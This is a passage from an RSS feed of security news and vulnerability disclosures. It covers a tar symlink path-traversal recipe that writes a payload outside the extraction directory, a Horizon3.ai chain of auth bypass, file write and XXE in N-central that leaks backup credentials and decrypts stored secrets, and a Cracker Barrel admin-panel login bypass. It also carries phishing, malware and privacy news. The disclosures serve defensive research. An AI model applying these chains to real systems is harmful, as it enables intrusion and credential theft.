   2\. This path also passes the symlink check as it evaluates to the destination directory.

After they have both been created `"ptr"` now effectively points to `"./../../../../../../../../../tmp"`, which is likely outside the destination directory.

##### Putting it Together

The following tar entries can now be used for arbitrary writes:

1. Directory `"decoy"`.
   1. The directory "{dst}/decoy" is created.
2. Symlink `"ptr"`-> `"decoy"`.

   2\. The symlink `"{dst}/ptr"` is created.
3. Empty file `"ptr/dummy"`.

   3\. The file `"{dst}/ptr/dummy"` is extracted (i.e `"{dst}/decoy/dummy")`.

   3\. This write also causes `"{dst}/ptr"` to be inserted into memo.
4. Symlink `"ptr"`-> `"noop/noop/noop/noop/noop/noop/noop/noop/noop/../../../../../../../../../tmp"`.

   4\. The symlink `"{dst}/ptr"` is replaced.
5. Symlink `"noop"`-> `"."`.

   5\. The symlink `"{dst}/noop"` is created.

5. `"ptr"` now points to `"{dst}/./../../../../../../../../../tmp"`.
6. Malicious payload file `"ptr/payload"`.

   6\. The file `"{dst}/ptr/payload"` is extracted (i.e. `"/tmp/payload"`).

   6\. Validation on `"{dst}/ptr"` is skipped as it has already been added to `memo`.

GHSA-7j9j-68r2-f35q

GHSA-3wgq-wrwc-vqmv

### Timeline

**Date reported**: 08/11/2025

**Date fixed**: 09/23/2025

**Date disclosed**: 11/17/2025]]></content:encoded></item><item><title>HEX ADVENT 2025: Crack the Advent, Conquer the Threat</title><link>https://starlabs.sg/blog/2025/11-hex-advent-2025/</link><author>STAR Labs SG</author><category>vulns</category><pubDate>Mon, 17 Nov 2025 23:59:04 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# HEX ADVENT 2025: Crack the Advent, Conquer the Threat 🐛

**WELCOME TO HEX ADVENT 2025**, ‘tis the season to **Unwrap Your Potential! 🎁**

HEX ADVENT 2025 is a Christmas-themed CTF Advent Calendar, **designed for women, by women**.

## What to Expect

- **12 Days, 12 Challenges**: A structured schedule to build mastery across different CTF categories.
- **Focus Areas**:
  - Pwn (Binary Exploitation)
  - Cryptography
  - Reverse Engineering
  - Forensics
  - OSINT
  - Web Exploitation
- **Our Mission**: To empower women in cybersecurity, create visible role models, and cultivate a robust local talent pool.

**Date****What To Expect?**1 to 12 Dec 2025New challenges unlocked at **09:00 SGT** daily1 to 31 Dec 2025Challenges open until **31 Dec 2025, 23:59 SGT**

✍🏻➡️ **REGISTER** TO PLAY NOW

✅➡️ Fill in this **Google Form** to confirm your eligibility

## Event Information & Rules

Please refer to this **blog post** for the full Event Information and Rules.

## Prize Haul

A challenge is considered solved when the correct flag is submitted on CTFd before the final deadline: **31 December 2025, 23:59 SGT**.

💰 **Cumulative & Shared Prize Pools**

**Challenges Solved****Prize Pool**10S$40011S$70012S$1000

The cash prizes are cumulative, and **shared equally** among all eligible players at each tier.

Example: Players solving 12 challenges stand to receive a share of the S$400, S$700, and S$1000 pools.

Note: If you solve 10/11/12 challenges in total, the write-ups for three specific challenges are mandatory to verify your eligibility for the prize pools.

🎁 **Exclusive Swags**

**Challenges Solved****Swag**≥ 1Exclusive Event T-shirt≥ 6T-shirt, Pin, Key Chain≥ 10All Swags + A share of the three cash prize pools

Swags are awarded to **individuals**, and are not shared.

To receive the T-shirt in your preferred size, register on **CTFd**, and **confirm your eligibility** by **15 December 2025**.

✍🏻 **Best Write-Up Prize**

We are awarding **3 prizes of S$100** each for the **Best Write-Up** submissions. Level up your explanation and documentation skills by submitting a write-up for the hard pwn, crypto, and reverse engineering challenges!

📋 **Write-Up Submission Rules**

Write-ups are generally optional, but they are required for prize eligibility in two cases:

- **Best Write-Up Prize (Optional)**: You may optionally submit a write-up for this challenge to compete for the S$100 Best Write-Up Prize.
- **For Top Solvers (Mandatory)**: If you solve 10/11/12 challenges in total, the write-ups for three specific challenges are mandatory to verify your eligibility for the prize pools.

Winning entries will be featured and published on our social media platforms.

📦 **Prize Collection**

Winners will be notified in January-2026 with the collection details.

## ❓ Frequently Asked Questions

View our FAQs **here**

Credits:

- Challenge Authors: Ada Lum, Ariana Goh, Cherie-Anne Lee, Verity Lim, Wu Yuewei, Yvonne Chua
- Poster Designer: Sarah Tan
- Organising Team: Alicia Ho, Carol Ng, Frances Loy, Joel Wong, Lauren Chua, Sarah Tan]]></content:encoded></item><item><title>N-able N-central: From N-days to 0-days</title><link>https://horizon3.ai/attack-research/attack-blogs/n-able-n-central-from-n-days-to-0-days/</link><author>/u/scopedsecurity</author><category>netsec</category><pubDate>Mon, 17 Nov 2025 18:47:21 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Earlier this year, N-able N-central popped up on the CISA KEV for two vulnerabilities: CVE-2025-8875 and CVE-2025-8876. This pair of vulnerabilities allow an authenticated attacker to achieve remote code execution via deserialization and command injection. Any time an authenticated vulnerability pops up in widely deployed enterprise software, it piques our interest to see if there is something more to find.During the investigation, we uncovered several other critical security issues that existed in the most up-to-date version of N-central. The issues, when combined, allow for an unauthenticated attacker to interact with legacy APIs and read sensitive files on the filesystem – including files that leak credentials and other sensitive information. In nearly all deployments, we found that the leaked credentials led to compromising the N-central database which contains all integration secrets such as domain credentials, N-central user API keys, integrated device and service API keys, SSH private keys, and more.The vulnerabilities reported were assigned:CVE-2025-9316: Authentication Bypass via Weak Authentication MethodCVE-2025-11700: Authenticated XML External Entity (XXE) Information LeakN-central is N-able’s remote managing and monitoring solution (RMM) allowing for large enterprises and MSPs to easily manage, configure, patch, and run reporting and analytics.It is not uncommon to find deployed on the internet, with approximately 3000 instances listed on Shodan. Given the recent addition N-central to the CISA KEV and threat actors commonly targeting RMM software (SimpleHelp, ConnectWise, and BeyondTrust as fairly recent examples), this is definitely a target of interest.CVE-2025-8875: Authenticated Insecure DeserializationThe pair of vulnerabilities were patched in N-central 2025.3.0.14 released 15 July 2025. Patch diffing this release with an earlier release we quickly stumble upon the insecure deserialization in both the  and LicenseReponseUnsolicited0008 classes. The class’s  method takes in a user controlled byte array, creates an  and calls  on it. This functionality is reachable via the legacy SOAP APIs on the  endpoint via the  method which calls the below ServerActivate.activate(). CVE-2025-8876: Authenticated Command InjectionThe patch included many areas of code where shell commands were constructed with user input and called via helper utilities that attempted to sanitize any user input, but not all functions utilized this helper. One such function that stood out was MotherShipMonitoringFeatureServiceImpl.activateMotherShipMonitoring(), now removed in the patch, which constructed a shell command and passed user input directly to a execution utility function.The  utility also makes no effort to sanitize user input before calling Runtime.getRuntime().execute().The activateMothershipMonitoring() method was reachable via the /dms2/services2/ServerUI2 legacy SOAP API via the mothershipMonitoringActivate API method, but has since been removed from the API entirely.Both API endpoints and vulnerable paths to the code required a valid session ID to interact with them, so the plan was to find a way to get a session ID. The patches also contained a significant amount of hardening around API Refresh and Access tokens, and it seemed like there might be something there there, but before we could suss out any insecurities, we stumbled upon the legacy SOAP API method . The  method is exposed across many of the legacy SOAP API endpoints, takes in several arguments, and passes control to SessionHello.sessionHello(). The function inspects the user controlled input, and conditionally returns a valid session ID intended for a network-peer appliance to communicate with the N-central server. Unfortunately, in the default configuration of N-central, the database comes preconfigured with several builtin appliances for which all values needed to retrieve a session ID are static and known across installs.Sending the crafted SOAP API request to the /dms/services/ServerMMS endpoint with the crafted inputs allows an attacker to retrieve a valid session ID.Fortunately for N-central, the legacy SOAP APIs scope session IDs differently for appliances versus users. This session ID, while valid for the  and  endpoints, does not work on other endpoints, such as  and 2 where the previous vulnerability was found, which expect a user session ID.This vulnerability existed both in the unpatched version and patched version (2025.3.09). After discovering this issue, we promptly reported it to N-able and was assigned CVE-2025-9316.Continuing the Hunt – Reading Lots of CodeWith a valid session ID for an appliance, we continued auditing the  and  APIs for where authenticated access might lead to some softer areas of code. Much of the code seemed less interesting, allowing the appliance to interact with the N-central database for tasking and reporting information about itself, but no code-level vulnerabilities were discovered like SQL injection or command injection. One function did stand out, , which allows writing arbitrary content to a specific file path on disk: /opt/nable/webapps/ROOT/applianceLog/network_check_log_<appliance_ID>.log.Coming up short on finding an abusable set of functions in the ServerMMS APIs, we began searching for other vulnerability classes like XML External Entity (XXE). Turning to grep, we reviewed every call in the API libraries that constructed XML parser objects like . One instance in XMLValidator.validateXML() creates a SAXParser instance without setting secure defaults that would disallow external entities via DTDs.The call chains discovered that utilized the vulnerable XMLValidator parser, however, all originated from the  API endpoint. When testing several ServerUI API methods with our previously obtained session ID, the server would return access denied due to the scoping issue of having an appliance session ID.But! Further inspection of all the available ServerUI methods showed that some methods do not validate the passed in session ID. To our great fortune, the call chains in the ServerUI endpoint that lead to the vulnerable XMLValidator code do not validate the session ID in any way. This XXE vulnerability was assigned CVE-2025-11700.The ServerUI endpoint we abuse is importServiceTemplateFromFile. We supply any session ID, a customer ID of 1 (exists by default), and supply a filepath to a file that exists on disk on the N-central appliance. Our limited file write discovered above now has value.Following the code path, we enter ImportServiceTemplateFromFile.importServiceTemplate(). Which in turn calls ImportServiceTemplateFromFile.doImport(). This function lightly validates that file exists, and that the XML contains a version string. Simple enough to pass validation so far.The code eventually reaches ServiceTemplateParser.parse(), which calls our vulnerable function XMLValidator.validateXML().To summarize what we’ve found so far:CVE-2025-9316 – An authentication bypass via weak authentication methodAn authenticated limited file write (not assigned a CVE)CVE-2025-11700 – An unauthenticated file-based parsing XXESend a  request to  to retrieve an appliance session IDSend an  request to  with our newly obtained session ID and a crafted base64 encoded string that becomes the XML content at the file location /opt/nable/webapps/ROOT/applianceLog/network_check_log_<appliance_ID>.logSend an importServiceFromTemplate request to  with an arbitrary session ID and the file path above Lets chain all these together to retrieve a file on disk.The end-to-end proof of concept exploit to leak files can be found on our GitHub.There are many files that exist on the appliance that are valuable to exfiltrate. Log files verbosely log the session IDs of other users and appliances, which can be used to directly interact with API endpoints to manage the appliance. The most valuable data resides in the N-central database, which we found is backed up at regular interval in most client environments. The backup credentials are stored in cleartext, along with server location, in the file /opt/nable/var/ncsai/etc/ncbackup.conf. The N-central backup is essentially an entire filesystem backup of the appliance, including the N-central database.Retrieving the backup via the credentials in from the XXE chain, we find that its a tar archive.The files of interest are:var/opt/n-central/tmp/ncbackup/ncbackup.binA postrges dump file that can be restoredsudo -u postgres pg_restore -d ncentral_restore var/opt/n-central/tmp/ncbackup/ncbackup.binopt/nable/etc/keystore.bcfksA password protected keystore file used in encrypting and decrypting sensitive fields (passwords, API keys, etc) in the databaseopt/nable/etc/masterPasswordThe password that protects the above keystore filePotentially crack the builtin root or admin or service account users to use over SSH (we did not try hard to crack these)Once the database is restored, sensitive fields (prefixed ) can be decrypted to reveal credentials, private SSH keys, and more.With a little Claude code magic, re-implementing the decryption logic given the cryptographic key files in the backup, we can decrypt all the secrets.We reported a handful of security issues in total, many variants of the assigned vulnerabilities, which include:Authentication bypass via the vulnerable  method was exposed across several legacy SOAP API endpoints with various different method signatures and unique code pathsXXE via the  and also importServiceTemplateFromFileA file upload path traversal variant allowing writing mostly-fixed filename writing to arbitrary locationsThe N-central appliance allows administrative users to retrieve logs from Administration Utilities -> View Logs. Indicators that the XXE has been abused will be apparent in multiple log locations.dmsservice.log
“Failed to import service template from file” which is immediately followed by the contents of the file leaked by the XXE“Exception calling ServerUI:importServiceTemplateFromFile” which again is immediately followed by the contents of the leaked filedmsservice_soap.log
“servicetemplate xml could not be imported” which also includes the maliciously uploaded XML which could be inspected for external DTD references to identify attacker infrastructure and files targetedEvidence of abuse of the authentication bypass was not observable in the default log configurations.18 August 2025 – Began N-central N-day investigation19 August 2025 – Discovered authentication bypass20 August 2025 – Reported authentication bypass to N-able21 August 2025 – N-able acknowledges and assigns CVE-2025-931621 August 2025 – Discovered authentication bypass variants, file write, and XXE vulnerabilities26 August 2025 – Reported authentication bypass variants, file write, and XXE vulnerabilities to N-able26 August 2025 – N-able acknowledges and forwards report to internal teams5 September 2025 – Discovered another XXE variant and file write path traversal8 September 2025 – Reported XXE variant and file write path traversal to N-able9 September 2025 – Horizon3.ai proactively notifies its internet exposed customers and communicates an effective interim mitigation15 October 2025 – Horizon3 asks for an update15 October 2025 – N-able acknowledges security issues5 November 2025 – N-able mitigates vulnerabilities in release 2025.4.0.9 by making the specific legacy SOAP APIs abused not available in the default configuration13 November 2025 – CVE-2025-9316 and CVE-2025-11700 publicly assigned17 November 2025 – This blog post]]></content:encoded></item><item><title>Zucc&apos;s $16 Billion Scam Secret LEAKED</title><link>https://www.youtube.com/watch?v=Dm9cRcuiG2I</link><author>Seytonic</author><category>security</category><enclosure url="https://www.youtube.com/v/Dm9cRcuiG2I?version=3" length="" type=""/><pubDate>Mon, 17 Nov 2025 17:41:49 +0000</pubDate><source url="https://www.youtube.com/channel/UCW6xlqxSY3gGur4PkGPEUeA">Seytonic</source><content:encoded><![CDATA[0:00 Intro
0:18 Zucc's $16 Billion Scam Secret
4:25 Archive.today under threat
6:44 Traitor In American Defence Contractor

Sources:
https://www.reuters.com/investigations/meta-is-earning-fortune-deluge-fraudulent-ads-documents-show-2025-11-06/

https://x.com/archiveis/status/1984093883056422993
https://gyrovague.com/2023/08/05/archive-today-on-the-trail-of-the-mysterious-guerrilla-archivist-of-the-internet/

https://www.justice.gov/opa/pr/former-general-manager-us-defense-contractor-pleads-guilty-selling-stolen-trade-secrets
https://techcrunch.com/2025/11/03/how-an-ex-l3-harris-trenchant-boss-stole-and-sold-cyber-exploits-to-russia/
===============================================
My Website: https://www.seytonic.com/
Follow me on TWTR: https://twitter.com/seytonic
Follow me on INSTA: https://www.instagram.com/jhonti/
===============================================]]></content:encoded></item><item><title>The price of ChatGPT’s erotic chat? $20/month and your identity</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/the-price-of-chatgpts-erotic-chat-20-month-and-your-identity</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 17:18:52 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[To talk dirty to ChatGPT, you may soon have to show it your driver’s license.OpenAI announced last month that ChatGPT will soon offer erotica—but only for  That sounds like a clever guardrail until you realize what “verified” might mean: uploading government identification to a company that already knows your search history, your conversations, and maybe your fantasies.It’s a surreal moment for technology. The most famous AI tool in the world is turning into a porn gatekeeper. And it’s not happening in a vacuum. California just passed a law requiring age checks for app downloads. Discord’s age-verification partner was hacked this summer, exposing 70,000 government-issued IDs that are now being used for extortion. Twenty-four US states have passed similar laws. What began as an effort to keep kids off adult sites has quietly evolved into the largest digital ID system ever built. One we never voted for.The normalization of online ID checkpointsAge verification started as a moral crusade. Lawmakers wanted to protect minors from explicit material. However, every system that requires an ID online transforms into something else entirely: a surveillance checkpoint. To prove you’re an adult, you hand over the same information criminals and governments dream of having—and to a patchwork of private vendors who store it indefinitely.We’ve already seen where that leads. In the UK, after age-gating rules took effect under the Online Safety Act, one of the verification companies was breached. In the US, the AU10TIX breach exposed user data from Uber, X, and TikTok. Each time, the same story: people forced to upload passports, driver’s licenses, or selfies, only to watch that data leak.If hackers wanted to design a dream scenario for mass identity theft, this would be it. Governments legally requiring millions of adults to upload the exact documents criminals need.The irony is that none of this actually protects children. In the UK, VPN sign-ups spiked 1,400% the day the new restrictions went live. We hope that’s from adults balking at handing over personal data, but the point is any teen with a search bar can bypass an age-gate in minutes. The result isn’t a safer internet—it’s an internet that collects more data about adults while pushing kids toward sketchier, unregulated corners of the web.Parents already have better options for keeping inappropriate content at bay: device-level controls, filtered browsers, phones built for kids. None of those require turning the rest of us into walking ID tokens.Defenders like to compare online verification to showing ID at a bar. But when you flash your license to buy a beer, the cashier doesn’t scan it, store it, and build a permanent record of your drinking habits. Online verification does exactly that. Every log-in becomes another data point linking your identity to what you read, watch, and say.It’s not hard to imagine how this infrastructure expands. Today it’s porn, violence, and “mature” chatbots. Tomorrow it could be reproductive-health forums, LGBTQ+ resources, or political discussion groups flagged as “sensitive.” Once the pipes exist, someone will always find a new reason to use them.When innovation starts to feel invasiveLet’s be honest. We could all make money if we just decided to build porn machines, and that’s what this new offering from ChatGPT feels like. It didn’t take long for AI to grab a slice of the OnlyFans market. Except the price of admission isn’t only $20 a month; it’s potentially your identity and a whole lot of heartache.“Once you are asked to give certain types of information to a website, there’s no way to know what that company, who’s supposedly verifying your age, is doing with that information.” The verification process itself becomes a form of surveillance, creating detailed records of legal adult behavior that governments and cybercriminals can exploit.This is how surveillance gets normalized: one “safety” feature at a time. ChatGPT’s erotic mode will make ID-upload feel routine—a casual step before chatting with your favorite AI companion. But beneath the surface, those IDs will feed a new class of data brokers and third-party verifiers whose entire business depends on linking your real identity to everything you do online.We’ve reached the point where governments and corporations don’t need to build a single centralized database; we’re volunteering one piece at a time.ChatGPT’s latest intentions are a preview of what’s next. The internet has been drifting toward identity for years—from social logins to verified profiles—and AI is simply accelerating that shift. What used to be pockets of anonymity are becoming harder to find, replaced by a web that expects to know exactly who you are.The future of “safe” online spaces shouldn’t depend on handing over your driver’s license to an AI.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>New EVALUSION ClickFix Campaign Delivers Amatera Stealer and NetSupport RAT</title><link>https://thehackernews.com/2025/11/new-evalusion-clickfix-campaign.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjThsbRJ_lhgrHOpVNJwYWI0Xc25nNa8uJ5J41VrEz8dv-B5UVNQcMoYyddfmhabn_nHz_rfrkgJbC8KYvOSwyfgbPRuCo08qaxLraEFbe-F2KQG2YoVj_pYae0ArE0YUKcx9ysHzNSGo5XCv0tz5LDsnmJTfPPLLsf7EYv3SJPhlWw5SN0yR9plhnJPTiY/s1600/clickfix.jpg" length="" type=""/><pubDate>Mon, 17 Nov 2025 16:53:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have discovered malware campaigns using the now-prevalent ClickFix social engineering tactic to deploy Amatera Stealer and NetSupport RAT.
The activity, observed this month, is being tracked by eSentire under the moniker EVALUSION.
First spotted in June 2025, Amatera is assessed to be an evolution of ACR (short for "AcridRain") Stealer, which was available under the]]></content:encoded></item><item><title>A Cracker Barrel vulnerability</title><link>https://eaton-works.com/2025/11/17/cracker-barrel-hack/</link><author>/u/EatonZ</author><category>netsec</category><pubDate>Mon, 17 Nov 2025 15:45:01 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[November 19, 2025 update: Cracker Barrel awarded a $100 gift card.Cracker Barrel catapulted themselves into the news earlier this year with their big logo change controversy. After seeing them in the news so much, a thought came to mind: are they secure? I set out to find out! After poking around, I found a way to get into their rewards admin panel. Here is how I did it.The Cracker Barrel rewards currency is “pegs”. It’s named after the famous peg game. Essentially, pegs are rewards points. $1 spent = 1 peg. You can redeem your pegs online or in-store for food, drinks, etc.That’s really all there is to it. You can click the header link to learn more if you’d like.I came across an admin panel for the rewards. It is a corporate site and not a consumer site, so only Cracker Barrel employees are supposed to be able to get into it.It was a simple React JS app and you could see how the login worked by looking at :Looking closely, I saw an easy potential bypass method: setting the initial “isAuthenticated” value to true. One change in the compiled JS……and that was enough to get into the site! Sometimes it really is that simple.From here, you could manage the rewards and the associated peg values:That is pretty much it for the good stuff. Nothing sensitive was exposed and no customer data was at risk. The worst thing that could have happened would have been potential business disruption to the rewards system, or inflating your own rewards by modifying items you would then buy. No write actions were performed. While it looked possible to adjust production rewards, I opted to not test it since there’s probably a lot of rewards activity every second, so any brief change could have led to problems. It looks like they had the right idea for the auth – the code below sends an authorization token. Since I did not have one, I left it blank, so no token was sent. The API server would accept requests without a token, and that is where the vulnerability was.This time, I decided to give a third-party VDP a try that came recommended. I submitted it October 25, 2025. By the time I heard back on November 17, 2025, Cracker Barrel appeared to have noticed the vulnerability and fixed it themselves. As a result, no further action was required. It was cool to see a company proactively notice and fix a vulnerability so quickly!]]></content:encoded></item><item><title>Your coworker is tired of AI &amp;#8220;workslop&amp;#8221; (Lock and Code S06E23)</title><link>https://www.malwarebytes.com/blog/podcast/2025/11/your-coworker-is-tired-of-ai-workslop-lock-and-code-s06e23</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 15:44:24 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This week on the Lock and Code podcast…Everything’s easier with AI… except having to correct it. In just the three years since OpenAI released ChatGPT, not only has onlife life changed at home—it’s also changed at work. Some of the biggest software companies today, like Microsoft and Google, are forwarding a vision of an AI-powered future where people don’t write their own emails anymore, or make their own slide decks for presentations, or compile their own reports, or even read their own notifications, because AI will do it for them. But it turns out that offloading this type of work onto AI has consequences.In September, a group of researchers from Stanford University and BetterUp Labs published findings from an ongoing study into how AI-produced work impacts the people who receive that work. And it turns out that the people who receive that work aren’t its biggest fans, because it’s not just work that they’re having to read, review, and finalize. It is, as the researchers called it, “workslop.”“AI generated work content that masquerades as good work, but lacks the substance to meaningfully advance a given task. It can appear in many different forms, including documents, slide decks, emails, and code. It often looks good, but is overly long, hard to read, fancy, or sounds off.”Far from an indictment on AI tools in the workplace, the study instead reveals the economic and human costs that come with this new phenomenon of “workslop.” The problem, according to the researchers, is not that people are using technology to help accomplish tasks. The problem is that people are using technology to create ill-fitting work that still requires human input, review, and correction down the line.“The insidious effect of workslop is that it shifts the burden of the work downstream, requiring the receiver to interpret, correct, or redo the work,” the researchers wrote. Today, on the Lock and Code podcast with host David Ruiz, we speak with Dr. Kristina Rapuano, senior research scientist at BetterUp Labs, about AI tools in the workplace, the potential lost productivity costs that come from “workslop,” and the sometimes dismal opinions that teammates develop about one another when receiving this type of work.“This person said, ‘Having to read through workshop is demoralizing. It takes away time I could be spending doing my job because someone was too lazy to do theirs.'”Tune in today to listen to the full conversation.Listen up—Malwarebytes doesn’t just talk cybersecurity, we provide it.]]></content:encoded></item><item><title>PacketSmith X.509 Certificate Extractor (TLS over TCP and DTLS) - How To</title><link>https://packetsmith.ca/certificate_extractor/</link><author>/u/MFMokbel</author><category>netsec</category><pubDate>Mon, 17 Nov 2025 15:22:43 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Release 4.0 introduces a new capability: the scanning of TCP and UDP streams for x.509 certificates. You can now either export these certificates to disk or dissect their attributes and output them as JSON objects and arrays. It checks for certificates in all the streams that start with a TLS Handshake content type, and for handshakes of type Certificate. s. For the TCP protocol, the  is invoked to reconstruct valid streams. The scanning process against the TCP and UDP protocols is port-independent.The process of locating X.509 certificates in a pcap is not as simple as scanning the entire pcap payload or a packet for specific certificate constants and extracting them. On the contrary, the identification of such a certificate follows a strict set of rules for the TCP and UDP protocols.For the TCP protocol, and because of MTU limitations, with the possibility that a certificate might span more than one packet, TCP stream calculation becomes a necessity. And, working with TCP streams is not enough, because of packet retransmission, out-of-order packets, and other similar network behaviour. The latter necessitates the implementation of a TCP reassembly engine to handle such types of network behaviour, which is not an easy task.Once you have all the essential building blocks implemented up to the network layer, working with reassembled TCP streams and searching for certificates is another subtle task. This requires searching in an optimized fashion, all streams that start with a TLS/SSL Handshake (0x16) content type, containing handshakes of type Certificate (0x0b). From this point on, we extract the Certificate record layer certificate header to extract all certificates.For UDP and in case of handshake fragmentation, the TLS protocol uses fragments with sequence number, offset and length fields; consequently, those fragments have to be reassembled at the UDP stream level before scanning for certificates.We implemented a custom ASN.1 DER certificate parser to handle the parsing and validation of the acquired certificates. This tool dissects all certificate attributes, including various extensions. The extracted data is then exported as a detailed, organized, and hierarchical JSON array for both TCP and UDP streams. The extractor is highly reliable, making it unlikely to produce false positives (treating an invalid certificate as valid) or false negatives (missing a valid certificate).The TCP reassembly engine can be turned off and instead switch to payload concatenation of all packets in the stream. Based on our testing, the difference in performance for large pcaps is considerable. Moreover, even the stream’s directionality can be specified in the configuration file, up (c->s), down (s->c) or duplex (c< – >s).To demonstrate the performance difference, take the following pcap  (fsize: 55.5 MB; sha-1: 5b822dc38f8b97f0b966bce4601cf73cb40afbd1) as an example. According to PacketSmith’s calculation, it consists of 15227 streams, with 12469 being TCP-IPv4 and 2758 being UDP-IPv4. A total of 129 X.509 certificates are located exclusively in the TCP-IPv4 streams.With the TCP reassembly engine on, it takes about 7860_ms to dump all the certificates to a folder on disk, and around 5370_ms with the TCP reassembly engine off; A performance improvement of ~32%.The automated search, location, extraction, and subsequent dissection of X.509 certificates within packet captures is a fundamental requirement for creating fine-grained Intrusion Prevention/Detection System (IPS/IDS) rules. These policies leverage various certificate attributes, a methodology further explored in our research paper, . This is why we add additional metadata to every dissected certificate in the JSON object, such as the entropy, fingerprints against the certificate payload and the public key, and field-level dissection of the subject and issuer attributes.Let’s take the TLS over TCP traffic  (fsize: 2499 bytes) generated by  (Adversary Emulation Framework) as an example. The pcap consists of one TCP stream over TLS v1.2, with 20 packets in total.To extract all the certificates from the pcap, we execute the following PacketSmith cmd line option:Using the option , the above command will export all found certificates to the folder/Output path “C:\Users\PS\Desktop\certs”, under the filename with the format pattern:The metadata in the filename is specific to the stream id where the certificate is found. For example,And the output message you get from PacketSmith once the above command is successfully executed is the following:- a total of 1 x.509 DER certificate was dumped to C:\Users\PS\Desktop\certs– TCP-IPv4 -> 1– TCP-IPv6 -> 0– UDP-IPv6 -> 0To dump the JSON dissection of the certificate to the console, we use a similar command:Which outputs a JSON object similar to this:]]></content:encoded></item><item><title>Scammers are sending bogus copyright warnings to steal your X login</title><link>https://www.malwarebytes.com/blog/news/2025/11/scammers-are-sending-bogus-copyright-warnings-to-steal-your-x-login</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 13:57:19 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[One of my favorite Forbes correspondents recently wrote about receiving several fake copyright-infringement notices from X.Let’s suppose you get an email claiming it’s from X, warning:“We’ve received a DMCA notice regarding your account.”Chances are, you’ll be wondering what you did wrong. DMCA (Digital Millennium Copyright Act) notices are legal requests about copyrighted content, so it makes sense that many users would worry they broke the rules and feel eager to read the warning.“Some recent activity on your page may not fully meet our community standards. Please take a moment to review the information below and ensure your shared content follow our usage rules.Notice Date : {day received}”Kindly review the material You’ve shared.If you think this notice was sent in error, you can request a check using the link below.If no update is received within 24 hours, your page visibility may stay temporarily limited until the review is complete.We thank you for your attention and cooperation in keeping this space respectful and positive for all.”As usual, the scammers add some extra pressure by claiming your account may be hidden or limited if you don’t act within 24 hours.But the “Review Details” button doesn’t lead to anything on X. It does look a lot like the X login page, but it’s fake.Any username and password typed there go straight to the hackers—which could leave you with a compromised account.How to keep your X account safeHaving your X account stolen can be a major pain for you, your followers, and your reputation (especially if you’re in the cybersecurity field). So here are some tips to keep it safe:Make sure 2FA is turned on. We wrote an article about how to do this back when it was still called Twitter.When entering a username and password, or any type of sensitive information, check whether the URL in the address bar matches what you expect.Don’t click on links in unsolicited emails and check with the sender through another channel first. A real DMCA notice from X will include a full copy of the reporter’s complaint, including contact details, plus instructions for filing a counter-notice.Pro tip: You can upload suspicious messages of any kind to Malwarebytes Scam Guard. It will tell you whether it’s likely to be a scam and advise you what to do.If you suspect your account may be compromised:Make sure your email account associated with the account is secure.Revoke connections to third-party applications.Update your password in the third-party applications that you trust.Contact Support if you can’t log in after trying the above.Here are the full instructions from X for users who believe their accounts have been compromised.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit. Download Malwarebytes Mobile Security for iOS or Android and try it today!]]></content:encoded></item><item><title>Cat’s Got Your Files: Lynx Ransomware</title><link>https://thedfirreport.com/2025/11/17/cats-got-your-files-lynx-ransomware/</link><author>editor</author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 13:00:28 +0000</pubDate><source url="https://thedfirreport.com/">The DFIR Report</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>⚡ Weekly Recap: Fortinet Exploited, China&apos;s AI Hacks, PhaaS Empire Falls &amp; More</title><link>https://thehackernews.com/2025/11/weekly-recap-fortinet-exploited-chinas.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYrIvih8v801iuwvKwFIn6XEv3AU6PqcVoR_14uIenh52wn8RhXB3g2Bod_ktfErZTD-xDH_Chvyqlxw6dfYcjNShEgDd_jBrDXT_koU6zR0uB7iWBPVp8ERzmOpHzJIKZB2ycatBITb_ZZ-bhg2Nt99Uit0Ekjle_t84FIkMsJGdi2RPE3ICsXztDK1CD/s1600/recap-main.jpg" length="" type=""/><pubDate>Mon, 17 Nov 2025 12:34:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[This week showed just how fast things can go wrong when no one’s watching. Some attacks were silent and sneaky. Others used tools we trust every day — like AI, VPNs, or app stores — to cause damage without setting off alarms.
